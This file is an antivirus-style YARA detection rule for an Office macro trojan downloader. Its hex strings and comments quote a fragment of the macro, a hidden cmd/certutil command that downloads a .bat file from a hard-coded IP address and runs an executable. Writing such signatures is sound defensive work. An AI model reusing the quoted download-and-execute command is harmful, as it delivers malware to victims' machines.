
rule TrojanDownloader_O97M_EncDoc_PDP_MTB{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.PDP!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 "
		
	strings :
		$a_01_0 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 31 38 2e 31 35 39 2e 35 39 2e 32 35 33 2f 64 65 72 65 6b 2f 51 79 4a 45 71 4f 56 35 58 44 54 33 79 67 48 2e 62 61 74 } //1 = Shell("cmd /c certutil.exe -urlcache -split -f ""http://18.159.59.253/derek/QyJEqOV5XDT3ygH.bat
		$a_01_1 = {2e 65 78 65 2e 65 78 65 20 26 26 20 4e 7a 74 6d 66 6a 77 74 64 74 72 75 6b 6c 6d 64 66 73 62 79 69 64 6f 7a 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29 } //1 .exe.exe && Nztmfjwtdtruklmdfsbyidoz.exe.exe", vbHide)
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1) >=2
 
}